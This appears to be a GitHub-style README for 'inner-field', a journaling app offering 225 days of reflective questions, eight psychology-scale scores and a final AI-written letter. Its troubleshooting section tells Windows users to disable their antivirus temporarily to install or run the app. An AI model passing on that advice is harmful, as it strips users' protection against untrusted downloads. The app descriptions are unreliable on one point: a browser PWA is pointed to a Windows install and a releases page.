## 📖 About inner-field

inner-field is a simple journaling app designed to guide you through 225 days of self-discovery. Each day, you answer one question that encourages reflection and growth. The app uses eight psychology scales to help track your mental state. After you complete the journey, the app generates a personal letter using AI based on your answers. 多一点了解，就多一分笃定 (A little more understanding, a little more confidence).

The app is built to be easy to use and accessible. You do not need any technical skills to get started. It works on Windows and presents clear guidance for daily journaling.

## 🔍 Features

- Daily one-question journaling prompts  
- 225 days of guided self-discovery  
- Tracks eight psychological scales related to mental health and self-awareness  
- Generates a personalized AI letter based on your responses  
- Simple, distraction-free interface  
- Works offline once installed  
- Supports multiple languages including Chinese and English  
- Built with React, optimized as a Progressive Web App (PWA)

## 📚 How to Use inner-field

### Daily Journal Entry

Each day, inner-field presents one question designed to encourage self-reflection. Questions come from psychological research to help you become more aware of your feelings and thoughts.

- Open the app once a day to see the new question.
- Take your time typing your answer. You can write freely.
- Save your entry before closing.

### Tracking Progress

inner-field tracks your answers and reflects on your emotional state by scoring them across eight psychology scales related to:
- Anxiety  
- Resilience  
- Mindfulness  
- Self-esteem  
- Emotional regulation  
- Sensory sensitivity (important for highly sensitive persons)  
- Stress levels  
- Positive affect  

You can view your progress over time in the app’s "Insights" section. This overview helps you see patterns and changes.

### Personalized AI Letter

When you complete all 225 questions, inner-field provides a letter generated by AI. This letter summarizes your strengths, challenges, and unique qualities based on your journaling. It is meant to offer calm and thoughtful feedback for your self-awareness journey.

## 🛠 Troubleshooting

If the app does not open or run correctly on your Windows PC:

- Make sure your operating system is up to date.  
- Disable any antivirus software temporarily, as it can block installation or running.  
- Restart your computer after installing the app.  
- If the app crashes, try uninstalling and reinstalling it.  
- Check internet connection during the AI letter generation phase.  

For persistent issues, look for help on the GitHub repository’s Issues page.

## ⚡ Using inner-field as a Progressive Web App (PWA)

inner-field supports installation as a PWA. This means you can run it from your browser with an experience close to a native app.

1. Open the app’s web version from the GitHub releases page or direct link.

2. In your browser (Chrome or Edge recommended), click the menu (three dots) and select “Install inner-field” or “Add to desktop.”

3. The app runs in its own window with offline support.

4. Daily questions and journaling continue working without the internet once installed this way.
